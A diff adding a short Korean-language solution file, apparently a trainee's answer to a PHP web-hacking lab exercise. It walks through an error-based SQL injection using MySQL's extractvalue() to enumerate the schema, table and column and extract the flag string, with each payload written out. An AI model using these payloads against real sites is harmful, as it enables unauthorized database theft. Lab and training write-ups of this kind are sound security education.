@@ -1,0 +1,21 @@
+PHP 문제 8번 강인님 답
+
+#디비 찾는 쿼리
+select table_name from information_schema.tables where table_schema = database()
+
+
+1. 공격과정
+에러 찾기 :
+a%' and extractvalue(rand(), concat(0x3a,(select 'making error'))) and '1%'='1
+DB 찾기 : skinfosec
+a%' and extractvalue(rand(), (select concat(0x3a, count(SCHEMA_NAME)) from information_schema.schemata limit 0,1)) and '1%'='1
+테이블 수 찾기 : 7
+a%' and extractvalue(rand(), (select concat(0x3a, count(TABLE_NAME)) from information_schema.tables where TABLE_SCHEMA='skinfosec' limit 0,1)) and '1%'='1
+테이블 찾기 : eqst_answer
+a%' and extractvalue(rand(), (select concat(0x3a, TABLE_NAME) from information_schema.tables where TABLE_SCHEMA='skinfosec' limit 3,1)) and '1%'='1
+컬럼 수 찾기 : 1
+a%' and extractvalue(rand(), (select concat(0x3a, count(column_name)) from information_schema.columns where TABLE_NAME='eqst_answer' limit 0,1)) and '1%'='1
+컬럼 찾기 : answer_column
+a%' and extractvalue(rand(), (select concat(0x3a, column_name) from information_schema.columns where TABLE_NAME='eqst_answer' limit 0,1)) and '1%'='1
+정답 : skinfosec_eqst_lms_system
+a%' and extractvalue(rand(), (select concat(0x3a, answer_column) from skinfosec.eqst_answer limit 0,1)) and '1%'='1
